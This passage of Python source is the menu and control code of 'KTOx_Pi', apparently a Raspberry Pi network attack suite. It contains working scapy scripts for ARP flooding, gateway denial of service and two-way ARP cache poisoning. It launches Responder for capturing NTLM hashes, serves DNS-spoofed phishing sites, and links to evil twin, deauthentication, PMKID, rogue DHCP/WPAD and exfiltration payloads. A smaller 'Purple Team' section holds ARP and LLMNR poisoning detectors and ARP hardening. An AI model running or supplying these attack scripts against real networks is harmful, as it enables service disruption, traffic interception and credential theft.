        "  out=subprocess.check_output(['arp','-an'],text=True)\n"
        "  t={}\n"
        "  for line in out.splitlines():\n"
        "    p=line.split()\n"
        "    try:\n"
        "      ip=p[1].strip('()');mac=p[3]\n"
        "      if mac!='<incomplete>':t[ip]=mac\n"
        "    except:pass\n"
        "  return t\n"
        "base=arp()\n"
        "print(f'Baseline: {len(base)} entries')\n"
        "while True:\n"
        "  time.sleep(5);cur=arp()\n"
        "  for ip,mac in cur.items():\n"
        "    if ip in base and base[ip]!=mac:\n"
        "      print(f'! CHANGE {ip} {base[ip][:11]} -> {mac[:11]}');base[ip]=mac\n"
        "    elif ip not in base:\n"
        "      print(f'+ NEW {ip} {mac}');base[ip]=mac"
    ])


def do_rogue_detect():
    gw  = ktox_state["gateway"]
    net = gw.rsplit(".",1)[0]+".0/24" if gw else "192.168.1.0/24"
    _run_attack("ROGUE DETECT",[
        "python3","-c",
        f"""
import sys,time; sys.path.insert(0,'{KTOX_DIR}')
import scan
hosts=scan.scanNetwork('{net}')
known={{h[1]:h[0] for h in hosts if len(h)>1 and h[1]}}
print(f'Baseline: {{len(known)}} MACs')
while True:
    time.sleep(30)
    cur=scan.scanNetwork('{net}')
    for h in cur:
        mac=h[1] if len(h)>1 else ''; ip=h[0]
        if mac and mac not in known:
            print(f'! ROGUE {{ip}} {{mac}}'); known[mac]=ip
"""
    ])


def do_llmnr_detect():
    _run_attack("LLMNR DETECT",[
        "python3","-c",
        "from scapy.all import sniff,UDP,DNS,IP\n"
        "def h(p):\n"
        "  if UDP in p and p[UDP].dport==5355:\n"
        "    if DNS in p:\n"
        "      src=p[IP].src if IP in p else '?'\n"
        "      if p[DNS].qr==1: print(f'! RESPONSE {src} possible poison')\n"
        "      else:\n"
        "        qn=p[DNS].qd.qname.decode(errors='ignore') if p[DNS].qd else '?'\n"
        "        print(f'~ QUERY {src} {qn}')\n"
        "sniff(filter='udp and port 5355',prn=h,store=0)"
    ])


def do_responder_on():
    iface = ktox_state["iface"]
    rpy   = f"{INSTALL_PATH}Responder/Responder.py"
    if not os.path.exists(rpy):
        Dialog_info("Responder not\nfound.", wait=True)
        return
    subprocess.Popen(
        ["python3", rpy, "-Q", "-I", iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    Dialog_info(f"Responder ON\nIF: {iface}", wait=True)


def do_responder_off():
    subprocess.run(
        "kill -9 $(ps aux | grep Responder | grep -v grep | awk '{print $2}')",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    Dialog_info("Responder OFF", wait=True)


def do_arp_harden():
    hosts = ktox_state["hosts"]
    if not hosts:
        Dialog_info("No hosts.\nRun scan first.", wait=True)
        return
    if not YNDialog("ARP HARDEN", y="Yes", n="No",
                    b=f"Apply {len(hosts)}\nstatic entries?"):
        return
    applied = 0
    for h in hosts:
        ip  = h.get("ip",h[0]) if isinstance(h,dict) else h[0]
        mac = h.get("mac",h[1]) if isinstance(h,dict) else h[1] if len(h)>1 else ""
        if ip and mac and mac not in ("","N/A"):
            rc, _ = _run(["arp","-s",ip,mac])
            if rc == 0: applied += 1
    Dialog_info(f"✔ {applied} entries\nlocked.\nPoison blocked.", wait=True)


def do_baseline_export():
    Dialog_info("Exporting…", wait=False, timeout=1)
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = f"{LOOT_DIR}/baseline_{ts}.json"
    os.makedirs(LOOT_DIR, exist_ok=True)
    data = {
        "generated": ts,
        "interface": ktox_state["iface"],
        "gateway":   ktox_state["gateway"],
        "hosts": [
            h if isinstance(h,dict) else
            {"ip":h[0],"mac":h[1] if len(h)>1 else "",
             "vendor":h[2] if len(h)>2 else "",
             "hostname":h[3] if len(h)>3 else ""}
            for h in ktox_state["hosts"]
        ]
    }
    Path(path).write_text(json.dumps(data, indent=2))
    Dialog_info(f"✔ Saved:\nbaseline_{ts[:8]}\n{len(data['hosts'])} hosts", wait=True)


def do_start_mitm_suite():
    exec_payload(os.path.join(KTOX_DIR, "ktox_mitm.py"))


def do_dns_spoofing():
    sites = sorted([
        d for d in os.listdir(f"{INSTALL_PATH}DNSSpoof/sites")
        if os.path.isdir(f"{INSTALL_PATH}DNSSpoof/sites/{d}")
    ]) if os.path.exists(f"{INSTALL_PATH}DNSSpoof/sites") else []
    if not sites:
        Dialog_info("No phishing sites\nfound.", wait=True)
        return
    items = [f" {s}" for s in sites]
    sel   = GetMenuString(items)
    if not sel: return
    site  = sel.strip()
    if not YNDialog("DNS SPOOF", y="Yes", n="No", b=f"Spoof {site}?"):
        return
    webroot = f"{INSTALL_PATH}DNSSpoof/sites/{site}"
    subprocess.Popen(
        f"cd {webroot} && php -S 0.0.0.0:80",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    Dialog_info(f"DNS Spoof ON\n{site}", wait=True)


def do_dns_spoof_stop():
    subprocess.run("pkill -f 'php'", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run("pkill -f 'ettercap'", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    Dialog_info("DNS Spoof\nstopped.", wait=True)

# ═══════════════════════════════════════════════════════════════════════════════
# ── Payload directory scanner ──────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

PAYLOAD_CATEGORIES = [
    ("reconnaissance","Recon"),
    ("interception",  "Intercept"),
    ("dos",           "DoS"),
    ("wifi",          "WiFi"),
    ("bluetooth",     "Bluetooth"),
    ("social_eng",    "Social Eng"),
    ("exfiltration",  "Exfiltrate"),
    ("remote_access", "Remote"),
    ("evil_portal",   "Evil Portal"),
    ("games",         "Games"),
    ("general",       "General"),
    ("examples",      "Examples"),
]


def _list_payloads(category):
    cat_dir = Path(default.payload_path) / category
    if not cat_dir.exists(): return []
    result = []
    for f in sorted(cat_dir.glob("*.py")):
        if f.name.startswith("_"): continue
        name = f.stem.replace("_"," ").title()
        try:
            for line in f.read_text(errors="ignore").splitlines()[:10]:
                if line.startswith("# NAME:"): name = line[7:].strip()
        except Exception:
            pass
        result.append((name, str(f)))
    return result

# ═══════════════════════════════════════════════════════════════════════════════
# ── Menu class ─────────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

class KTOxMenu:
    which  = "home"
    select = 0

    def _menu(self):
        return {

        # ── HOME ──────────────────────────────────────────────────────────────
        "home": (
            (" Network",       "net"),
            (" Offensive",     "off"),
            (" WiFi Engine",   "wifi"),
            (" MITM & Spoof",  "mitm"),
            (" Responder",     "resp"),
            (" Purple Team",   "purple"),
            (" Payloads",      "pay"),
            (" Loot",          "loot"),
            (" Stealth",       enter_stealth),
            (" System",        "sys"),
        ),

        # ── NETWORK ───────────────────────────────────────────────────────────
        "net": (
            (" Scan Network",    do_network_scan),
            (" Show Hosts",      self._show_hosts),
            (" Ping Gateway",    self._ping_gw),
            (" Network Info",    self._net_info),
            (" ARP Watch",       do_arp_watch),
        ),

        # ── OFFENSIVE ─────────────────────────────────────────────────────────
        "off": (
            (" Kick ONE off",   self._kick_one),
            (" Kick ALL off",   self._kick_all),
            (" ARP MITM",       self._do_mitm),
            (" ARP Flood",      self._arp_flood),
            (" Gateway DoS",    self._gw_dos),
            (" ARP Cage",       self._arp_cage),
            (" NTLMv2 Capture", self._ntlm),
        ),

        # ── WiFi ENGINE ───────────────────────────────────────────────────────
        "wifi": (
            (" Enable Monitor",  do_wifi_monitor_on),
            (" Disable Monitor", do_wifi_monitor_off),
            (" WiFi Scan",       do_wifi_scan),
            (" Deauth (Payload)",partial(exec_payload,"interception/deauth")),
            (" Handshake Cap",   self._handshake),
            (" PMKID Attack",    self._pmkid),
            (" Evil Twin AP",    self._evil_twin),
            (" Select Adapter",  self._select_adapter),
        ),

        # ── MITM & SPOOF ──────────────────────────────────────────────────────
        "mitm": (
            (" Start MITM Suite",   do_start_mitm_suite),
            (" DNS Spoofing ON",    do_dns_spoofing),
            (" DNS Spoofing OFF",   do_dns_spoof_stop),
            (" Rogue DHCP/WPAD",    partial(exec_payload,"interception/rogue_dhcp_wpad")),
            (" Silent Bridge",      partial(exec_payload,"interception/silent_bridge")),
            (" Evil Portal",        partial(exec_payload,"evil_portal/honeypot")),
        ),

        # ── RESPONDER ─────────────────────────────────────────────────────────
        "resp": (
            (" Responder ON",     do_responder_on),
            (" Responder OFF",    do_responder_off),
            (" Read Hashes",      self._read_responder_logs),
        ),

        # ── PURPLE TEAM ───────────────────────────────────────────────────────
        "purple": (
            (" ARP Watch",        do_arp_watch),
            (" ARP Diff Live",    do_arp_diff),
            (" Rogue Detector",   do_rogue_detect),
            (" LLMNR Detector",   do_llmnr_detect),
            (" ARP Harden",       do_arp_harden),
            (" Baseline Export",  do_baseline_export),
            (" Verify Baseline",  self._verify_baseline),
            (" SMB Probe",        partial(exec_payload,"reconnaissance/smb_probe")),
        ),

        # ── PAYLOADS ──────────────────────────────────────────────────────────
        "pay":    self._build_payload_menu(),

        # ── LOOT — special ────────────────────────────────────────────────────
        "loot":   None,

        # ── SYSTEM ────────────────────────────────────────────────────────────
        "sys": (
            (" WebUI Status",    self._webui_status),
            (" Refresh State",   self._refresh),
            (" System Info",     self._sysinfo),
            (" OTA Update",      partial(exec_payload,"general/auto_update")),
            (" Discord Webhook", self._discord_status),
            (" Reboot",          self._reboot),
            (" Shutdown",        self._shutdown),
        ),
        }

    # ── Rendering ─────────────────────────────────────────────────────────────

    def GetMenuList(self):
        tree  = self._menu()
        items = tree.get(self.which, ())
        if items is None: return []
        return [item[0] for item in items]

    def render_current(self):
        RenderMenuWindowOnce(self.GetMenuList(), self.select)

    # ── Navigation ────────────────────────────────────────────────────────────

    def navigate(self, key):
        tree  = self._menu()

        if key == "loot":
            self._browse_loot()
            return

        items = tree.get(key)
        if not items:
            Dialog_info("Empty menu.", wait=True)
            return

        labels = [item[0] for item in items]
        sel    = 0
        WINDOW = 7

        while True:
            total  = len(labels)
            offset = max(0, min(sel-2, total-WINDOW))
            window = labels[offset:offset+WINDOW]

            with draw_lock:
                _draw_toolbar()
                color.DrawMenuBackground()
                color.DrawBorder()
                # menu title strip
                _titles = {
                    "home":"▐ KTOx_Pi ▌","net":"Network",
                    "off":"Offensive","wifi":"WiFi Engine",
                    "mitm":"MITM & Spoof","resp":"Responder",
                    "purple":"Purple Team","sys":"System","pay":"Payloads",
                }
                _t = _titles.get(key, key.upper())
                draw.rectangle([3,13,125,24], fill="#1a0000")
                _centered(_t[:18], 13, font=small_font, fill=color.border)
                draw.line([(3,24),(125,24)], fill=color.border, width=1)
                _start_y = 26
                for i, label in enumerate(window):
                    is_sel = (i == sel-offset)
                    row_y  = _start_y + 13*i
                    if is_sel:
                        draw.rectangle(
                            [3, row_y, 124, row_y+12],
                            fill=color.select
                        )
                    fill = color.selected_text if is_sel else color.text
                    t = _truncate(label.strip(), 108)
                    draw.text((6, row_y+1), t, font=text_font, fill=fill)

            time.sleep(0.08)
            btn = getButton(timeout=120)

            if btn is None:                                continue
            elif btn == "KEY_DOWN_PIN":                    sel = (sel+1) % len(labels)
            elif btn == "KEY_UP_PIN":                      sel = (sel-1) % len(labels)
            elif btn in ("KEY_PRESS_PIN","KEY_RIGHT_PIN"):
                self.select = sel
                action = items[sel][1]
                if isinstance(action, str):
                    saved = self.which
                    self.which = action
                    self.navigate(action)
                    self.which = saved
                elif callable(action):
                    action()
            elif btn in ("KEY_LEFT_PIN","KEY1_PIN"):       return
            elif btn == "KEY2_PIN":
                self.which = "home"
                return
            elif btn == "KEY3_PIN":
                if ktox_state.get("running"):
                    ktox_state["running"] = None
                    Dialog_info("Stopped.", wait=False, timeout=1)

    def home_loop(self):
        while True:
            req = _check_payload_request()
            if req:
                exec_payload(req)
                continue
            self.navigate("home")

    # ── Network actions ───────────────────────────────────────────────────────

    def _show_hosts(self):
        hosts = ktox_state["hosts"]
        if not hosts:
            Dialog_info("No hosts.\nRun scan first.", wait=True)
            return
        lines = []
        for h in hosts:
            ip  = h.get("ip",h[0]) if isinstance(h,dict) else h[0]
            mac = h.get("mac",h[1]) if isinstance(h,dict) else (h[1] if len(h)>1 else "")
            lines.append(f" {ip}  {mac[:8]}")
        GetMenuString(lines)

    def _ping_gw(self):
        gw = ktox_state["gateway"]
        if not gw:
            Dialog_info("No gateway!", wait=True)
            return
        rc, out = _run(["ping","-c","4","-W","1",gw], timeout=10)
        lines = [f" GW: {gw}"] + [f" {l}" for l in out.splitlines()[-4:]]
        GetMenuString(lines)

    def _net_info(self):
        ip  = get_ip()
        gw  = ktox_state["gateway"]
        ifc = ktox_state["iface"]
        GetMenuString([
            f" IP:    {ip}",
            f" GW:    {gw}",
            f" IF:    {ifc}",
            f" WiFi:  {ktox_state['wifi_iface']}",
            f" Mon:   {ktox_state.get('mon_iface','off')}",
            f" Hosts: {len(ktox_state['hosts'])}",
            f" Loot:  {loot_count()} files",
        ])

    # ── Offensive actions ──────────────────────────────────────────────────────

    def _kick_one(self):
        tgt = _pick_host()
        if tgt and YNDialog("KICK", y="Yes", n="No", b=f"Kick {tgt}?"):
            do_arp_kick(tgt)

    def _kick_all(self):
        if YNDialog("KICK ALL", y="Yes", n="No", b="Boot everyone?"):
            do_arp_kick(ktox_state["gateway"])

    def _do_mitm(self):
        tgt = _pick_host()
        if tgt and YNDialog("MITM", y="Yes", n="No", b=f"MITM {tgt}?"):
            do_mitm(tgt)

    def _arp_flood(self):
        tgt = _pick_host()
        if tgt and YNDialog("ARP FLOOD", y="Yes", n="No", b=f"Flood {tgt}?"):
            _run_attack("ARP FLOOD", [
                "python3","-c",
                f"""
import sys,time; sys.path.insert(0,'{KTOX_DIR}')
from scapy.all import *
iface='{ktox_state["iface"]}'; tgt='{tgt}'
try:
    iface_mac=get_if_hwaddr(iface)
    ans,_=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=tgt),timeout=2,verbose=0,iface=iface)
    tgt_mac=ans[0][1][Ether].src if ans else 'ff:ff:ff:ff:ff:ff'
    print(f'Flooding {{tgt}}')
    while True:
        for fake_ip in ['10.0.0.{{}}'.format(i) for i in range(1,254)]:
            sendp(Ether(dst=tgt_mac)/ARP(op=2,pdst=tgt,hwdst=tgt_mac,psrc=fake_ip,hwsrc=iface_mac),iface=iface,verbose=0)
        time.sleep(0.2)
except Exception as e:
    print(f'Error: {{e}}')
"""
            ])

    def _gw_dos(self):
        gw = ktox_state["gateway"]
        if not gw:
            Dialog_info("No gateway!", wait=True)
            return
        if YNDialog("GW DoS", y="Yes", n="No", b=f"DoS {gw}?"):
            _run_attack("GW DoS", [
                "python3","-c",
                f"""
import sys,time; sys.path.insert(0,'{KTOX_DIR}')
from scapy.all import *
iface='{ktox_state["iface"]}'; gw='{gw}'
iface_mac=get_if_hwaddr(iface)
print(f'DoS on {{gw}}')
while True:
    for fake in ['192.168.0.{{}}'.format(i) for i in range(1,255)]:
        sendp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=2,pdst=gw,psrc=fake,hwsrc=iface_mac),iface=iface,verbose=0)
    time.sleep(0.05)
"""
            ])

    def _arp_cage(self):
        tgt = _pick_host()
        gw  = ktox_state["gateway"]
        if not tgt or not gw:
            return
        if YNDialog("ARP CAGE", y="Yes", n="No", b=f"Cage {tgt}?"):
            _run_attack("ARP CAGE", [
                "python3","-c",
                f"""
import sys,time; sys.path.insert(0,'{KTOX_DIR}')
from scapy.all import *
iface='{ktox_state["iface"]}'; gw='{gw}'; tgt='{tgt}'
try:
    iface_mac=get_if_hwaddr(iface)
    ans,_=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=tgt),timeout=2,verbose=0,iface=iface)
    tgt_mac=ans[0][1][Ether].src if ans else 'ff:ff:ff:ff:ff:ff'
    ans2,_=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=gw),timeout=2,verbose=0,iface=iface)
    gw_mac=ans2[0][1][Ether].src if ans2 else 'ff:ff:ff:ff:ff:ff'
    fake='10.66.66.66'
    print(f'Caging {{tgt}}')
    while True:
        sendp(Ether(dst=tgt_mac)/ARP(op=2,pdst=tgt,hwdst=tgt_mac,psrc=gw,hwsrc=iface_mac),iface=iface,verbose=0)
        sendp(Ether(dst=gw_mac)/ARP(op=2,pdst=gw,hwdst=gw_mac,psrc=tgt,hwsrc=iface_mac),iface=iface,verbose=0)
        sendp(Ether(dst=tgt_mac)/ARP(op=2,pdst=tgt,hwdst=tgt_mac,psrc=fake,hwsrc=iface_mac),iface=iface,verbose=0)
        time.sleep(3)
except Exception as e:
    print(f'Error: {{e}}')
finally:
    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
"""
            ])

    def _ntlm(self):
        self.navigate("resp")

    # ── WiFi actions ──────────────────────────────────────────────────────────

    def _handshake(self):
        mon = ktox_state.get("mon_iface")
        if not mon:
            Dialog_info("Enable monitor\nmode first.", wait=True)
            return
        exec_payload("wifi/wifi_handshake_capture")

    def _pmkid(self):
        mon = ktox_state.get("mon_iface")
        if not mon:
            Dialog_info("Enable monitor\nmode first.", wait=True)
            return
        exec_payload("wifi/pmkid_capture")

    def _evil_twin(self):
        exec_payload("wifi/evil_twin")

    def _select_adapter(self):
        rc, out = _run(["iw","dev"])
        import re
        ifaces = re.findall(r"Interface\s+(\w+)", out)
        if not ifaces:
            Dialog_info("No WiFi adapters!", wait=True)
            return
        sel = GetMenuString([f" {i}" for i in ifaces])
        if sel:
            ktox_state["wifi_iface"] = sel.strip()
            Dialog_info(f"Adapter:\n{sel.strip()}", wait=True)

    # ── Responder ─────────────────────────────────────────────────────────────

    def _read_responder_logs(self):
        log_dir = Path(f"{INSTALL_PATH}Responder/logs")
        if not log_dir.exists():
            Dialog_info("No Responder logs.", wait=True)
            return
        files = sorted(log_dir.glob("*.log"), reverse=True)[:10]
        if not files:
            Dialog_info("No log files yet.", wait=True)
            return
        sel = GetMenuString([f" {f.name[:22]}" for f in files])
        if not sel: return
        fname = sel.strip()
        match = [f for f in files if f.name == fname]
        if match:
            lines = match[0].read_text(errors="ignore").splitlines()
            GetMenuString([f" {l[:24]}" for l in lines[:50]])

    # ── Purple Team ───────────────────────────────────────────────────────────

    def _verify_baseline(self):
        baselines = sorted(Path(LOOT_DIR).glob("baseline_*.json"), reverse=True)
        if not baselines:
            Dialog_info("No baseline.\nExport one first.", wait=True)
            return
        try:
            data    = json.loads(baselines[0].read_text())
            known   = {h["mac"]:h["ip"] for h in data.get("hosts",[]) if h.get("mac")}
            current = ktox_state["hosts"]
            issues  = []
            for h in current:
                mac = h.get("mac",h[1]) if isinstance(h,dict) else (h[1] if len(h)>1 else "")
                ip  = h.get("ip",h[0])  if isinstance(h,dict) else h[0]
                if mac and mac not in known:     issues.append(f"! ROGUE {ip}")
                elif mac and known.get(mac) != ip: issues.append(f"! MOVED {mac[:11]}")
            if issues: GetMenuString(issues)
            else:      Dialog_info(f"✔ Clean!\n{len(current)} hosts match.", wait=True)
        except Exception as e:
            Dialog_info(f"Error:\n{str(e)[:28]}", wait=True)

    # ── Payloads ──────────────────────────────────────────────────────────────

    def _build_payload_menu(self):
        items = []
        for cat_key, cat_label in PAYLOAD_CATEGORIES:
            payloads = _list_payloads(cat_key)
            if payloads:
                items.append((f" {cat_label} ({len(payloads)})", f"pay_{cat_key}"))
        if not items:
            items = [(" No payloads found", lambda: Dialog_info(
                "Drop .py files into\n/root/KTOx/payloads\n/<category>/", wait=True))]
        # Also add the dynamic category submenus
        tree = self._get_payload_submenus()
        return tuple(items)

    def _get_payload_submenus(self):
        """Return a dict of pay_<cat> -> tuple of (label, callable) for navigate()."""
        subs = {}
        for cat_key, cat_label in PAYLOAD_CATEGORIES:
            payloads = _list_payloads(cat_key)
            if payloads:
                subs[f"pay_{cat_key}"] = tuple(
                    (f" {name}", partial(exec_payload, path))
                    for name, path in payloads
                )
        return subs

    # Override navigate to handle dynamic payload submenus
    def navigate(self, key):
        # Inject payload sub-menus into tree dynamically
        if key.startswith("pay_"):
            cat_key  = key[4:]
            payloads = _list_payloads(cat_key)
            if not payloads:
                Dialog_info("No payloads\nin this category.", wait=True)
                return
            items  = [(f" {name}", partial(exec_payload, path))
                      for name, path in payloads]
            labels = [i[0] for i in items]
            sel    = 0
            WINDOW = 7
            while True:
                total  = len(labels)
                offset = max(0, min(sel-2, total-WINDOW))
                window = labels[offset:offset+WINDOW]
                with draw_lock:
                    _draw_toolbar()
                    color.DrawMenuBackground()
                    color.DrawBorder()
                    for i, label in enumerate(window):
                        is_sel = (i == sel-offset)
                        if is_sel:
                            draw.rectangle(
                                [default.start_text[0]-5,
                                 default.start_text[1]+default.text_gap*i,
                                 122,
                                 default.start_text[1]+default.text_gap*i+12],
                                fill=color.select
                            )
                        fill = color.selected_text if is_sel else color.text
                        t = _truncate(label, 112-default.start_text[0])
                        draw.text(
                            (default.start_text[0],
                             default.start_text[1]+default.text_gap*i),
                            t, font=text_font, fill=fill
                        )
                time.sleep(0.08)
                btn = getButton(timeout=120)
                if btn is None:                                continue
                elif btn == "KEY_DOWN_PIN":                    sel = (sel+1)%total
                elif btn == "KEY_UP_PIN":                      sel = (sel-1)%total
                elif btn in ("KEY_PRESS_PIN","KEY_RIGHT_PIN"):
                    items[sel][1]()
                elif btn in ("KEY_LEFT_PIN","KEY1_PIN"):       return
                elif btn == "KEY2_PIN":
                    self.which = "home"; return
            return

        # Standard navigate
        tree = self._menu()

        if key == "loot":
            self._browse_loot()
            return

        items = tree.get(key)
        if not items:
            Dialog_info("Empty menu.", wait=True)
            return

        labels = [item[0] for item in items]
        sel    = 0
        WINDOW = 7

        while True:
            total  = len(labels)
            offset = max(0, min(sel-2, total-WINDOW))
            window = labels[offset:offset+WINDOW]

            with draw_lock:
                _draw_toolbar()
                color.DrawMenuBackground()
                color.DrawBorder()
                # menu title strip
                _titles = {
                    "home":"▐ KTOx_Pi ▌","net":"Network",
                    "off":"Offensive","wifi":"WiFi Engine",
                    "mitm":"MITM & Spoof","resp":"Responder",
                    "purple":"Purple Team","sys":"System","pay":"Payloads",
                }
                _t = _titles.get(key, key.upper())
                draw.rectangle([3,13,125,24], fill="#1a0000")
                _centered(_t[:18], 13, font=small_font, fill=color.border)
                draw.line([(3,24),(125,24)], fill=color.border, width=1)
                _start_y = 26
                for i, label in enumerate(window):
                    is_sel = (i == sel-offset)
                    row_y  = _start_y + 13*i
                    if is_sel:
                        draw.rectangle(
                            [3, row_y, 124, row_y+12],
                            fill=color.select
                        )
                    fill = color.selected_text if is_sel else color.text
                    t = _truncate(label.strip(), 108)
                    draw.text((6, row_y+1), t, font=text_font, fill=fill)

            time.sleep(0.08)
            btn = getButton(timeout=120)

            if btn is None:                                continue
            elif btn == "KEY_DOWN_PIN":                    sel = (sel+1)%len(labels)
            elif btn == "KEY_UP_PIN":                      sel = (sel-1)%len(labels)
            elif btn in ("KEY_PRESS_PIN","KEY_RIGHT_PIN"):
                self.select = sel
                action = items[sel][1]
                if isinstance(action, str):
                    saved      = self.which
                    self.which = action
                    self.navigate(action)
                    self.which = saved
                elif callable(action):
                    action()
            elif btn in ("KEY_LEFT_PIN","KEY1_PIN"):       return
            elif btn == "KEY2_PIN":
                self.which = "home"; return
            elif btn == "KEY3_PIN":
                if ktox_state.get("running"):
                    ktox_state["running"] = None
                    Dialog_info("Stopped.", wait=False, timeout=1)

    def home_loop(self):
        while True:
            req = _check_payload_request()
            if req:
                exec_payload(req)
                continue
            self.navigate("home")

    # ── System actions ─────────────────────────────────────────────────────────

    def _webui_status(self):
        ip = get_ip()
        GetMenuString([
            f" WebUI:  http://{ip}:8080",
            f" WS:     ws://{ip}:8765",
            f" Frame:  /dev/shm/ktox_last.jpg",
            " Open from any browser",
            " on the same LAN.",
        ])

    def _refresh(self):
        Dialog_info("Refreshing…", wait=False, timeout=1)
        refresh_state()
        Dialog_info(f"IF: {ktox_state['iface']}\nGW: {ktox_state['gateway']}", wait=True)

    def _sysinfo(self):
        rc, kern = _run(["uname","-r"])
        rc2, up  = _run(["uptime","-p"])
        GetMenuString([
            f" KTOx_Pi v{VERSION}",
            f" Kernel: {kern.strip()[:18]}",
            f" {up.strip()[:22]}",
            f" Temp:  {_temp_c:.1f} C",
            f" Loot:  {loot_count()} files",
            f" IP:    {get_ip()}",
        ])

    def _discord_status(self):
        wh = Path(INSTALL_PATH+"discord_webhook.txt")
        if wh.exists() and wh.stat().st_size > 10:
            url   = wh.read_text().strip()
            short = url[:28]+"…" if len(url)>28 else url
            lines = [" Discord webhook:", f" {short}"]
        else:
            lines = [" Discord: not set.",
                     " Edit:", " discord_webhook.txt"]
        GetMenuString(lines)

    def _reboot(self):
        if YNDialog("REBOOT", y="Yes", n="No", b="Reboot device?"):
            Dialog_info("Rebooting…", wait=False, timeout=2)
            os.system("reboot")

    def _shutdown(self):
        if YNDialog("SHUTDOWN", y="Yes", n="No", b="Shut down?"):
            Dialog_info("Shutting down…", wait=False, timeout=2)
            os.system("sync && poweroff")

    def _browse_loot(self):
        try:
            files = sorted(Path(LOOT_DIR).rglob("*"),
                           key=lambda f: f.stat().st_mtime, reverse=True)
            files = [f for f in files if f.is_file()]
        except Exception:
            files = []
        if not files:
            Dialog_info("No loot yet!", wait=True)
            return
        items = [f" {f.name[:22]}" for f in files[:30]]
        sel   = GetMenuString(items)
        if not sel: return
        fname = sel.strip()
        match = [f for f in files if f.name == fname]
        if not match: return
        try:
            lines = match[0].read_text(errors="ignore").splitlines()
            GetMenuString([f" {l[:24]}" for l in lines[:60]])
        except Exception:
            Dialog_info("Can't read file.", wait=True)


# ── Singleton ──────────────────────────────────────────────────────────────────
m = KTOxMenu()

# ═══════════════════════════════════════════════════════════════════════════════
# ── Boot splash ────────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def show_splash():
    """Boot splash — shown after logo BMP."""
    with draw_lock:
        draw.rectangle([(0,0),(128,128)], fill="#000000")
        # Top and bottom blood-red bars
        draw.rectangle([(0,0),(128,4)],     fill=color.border)
        draw.rectangle([(0,124),(128,128)], fill=color.border)
        # Side accent lines
        draw.rectangle([(0,0),(2,128)],     fill="#3a0000")
        draw.rectangle([(126,0),(128,128)], fill="#3a0000")
        # Title
        _centered("▐ KTOx_Pi ▌",  10, fill=color.border)
        # Divider
        draw.line([(8,22),(120,22)], fill="#3a0000", width=1)
        # Subtitle
        _centered("Network Control", 26, fill=color.selected_text)
        _centered("Suite",           40, fill=color.selected_text)
        # Divider
        draw.line([(8,52),(120,52)], fill="#3a0000", width=1)
        # Hardware
        _centered("Pi Zero 2W",      58, fill=color.text)
        _centered("Kali ARM64",      70, fill=color.text)
        # Version
        _centered(f"v{VERSION}",     84, fill=color.border)
        # Bottom tagline
        draw.line([(8,96),(120,96)],  fill="#3a0000", width=1)
        _centered("authorized",     102, fill="#6b1a1a")
        _centered("eyes only",      114, fill="#6b1a1a")
    time.sleep(1)

# ═══════════════════════════════════════════════════════════════════════════════
# ── Boot sequence ──────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def boot():
    os.makedirs(LOOT_DIR,   exist_ok=True)
    os.makedirs(PAYLOAD_DIR, exist_ok=True)

    # Symlink /root/KTOx/loot → KTOx loot for payload compatibility
    rj_dir  = "/root/KTOx"
    rj_loot = rj_dir + "/loot"
    os.makedirs(rj_dir, exist_ok=True)
    if not os.path.exists(rj_loot):
        try: os.symlink(LOOT_DIR, rj_loot)
        except OSError: pass

    _hw_init()

    show_splash()

    # Start refresh and web servers in parallel — don't block boot
    threading.Thread(target=refresh_state, daemon=True).start()

    for script in ("device_server.py", "web_server.py"):
        spath = Path(INSTALL_PATH + script)
        if spath.exists():
            try:
                subprocess.Popen(
                    ["python3", str(spath)],
                    cwd=INSTALL_PATH,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
            except Exception:
                pass

    with draw_lock:
        draw.rectangle([(0,0),(128,128)], fill="#000000")
        draw.rectangle([(0,0),(128,4)],   fill=color.border)
        draw.rectangle([(0,124),(128,128)], fill=color.border)
        _centered("▐ KTOx_Pi ▌", 10, fill=color.border)
        draw.line([(8,22),(120,22)], fill="#3a0000", width=1)
        _centered("Starting…",    34, fill=color.text)
        _centered("WebUI  :8080", 52, fill="#3a0000")
        _centered("WS     :8765", 64, fill="#3a0000")

    with draw_lock:
        draw.rectangle([(0,0),(128,128)], fill="#000000")
        draw.rectangle([(0,0),(128,4)],     fill=color.border)
        draw.rectangle([(0,124),(128,128)], fill=color.border)
        _centered("▐ KTOx_Pi ▌",  10, fill=color.border)
        draw.line([(8,22),(120,22)], fill="#3a0000", width=1)
        _centered("READY",          34, fill="#2ecc71")
        draw.line([(8,46),(120,46)], fill="#3a0000", width=1)
        _centered(f"IP: {get_ip()}", 52, fill=color.selected_text)
        _centered(f"IF: {ktox_state['iface']}", 64, fill=color.selected_text)
        draw.line([(8,76),(120,76)], fill="#3a0000", width=1)
        _centered("WebUI :8080",    82, fill=color.text)
        _centered("WS    :8765",    94, fill=color.text)
        draw.line([(8,106),(120,106)], fill="#3a0000", width=1)
        _centered("authorized",    112, fill="#6b1a1a")
    time.sleep(2)

    with draw_lock:
        draw.rectangle([(0,0),(128,128)], fill=color.background)
        color.DrawBorder()

    start_background_loops()
    print(f"[KTOx] Boot OK — IP={get_ip()} IF={ktox_state['iface']}")
    m.home_loop()

# ═══════════════════════════════════════════════════════════════════════════════
# ── Entry point ────────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def _sig(sig, frame):
    _stop_evt.set()
    if HAS_HW:
        try: GPIO.cleanup()
        except Exception: pass
    sys.exit(0)


if __name__ == "__main__":
    if HAS_HW and os.geteuid() != 0:
        print("Must run as root"); sys.exit(1)
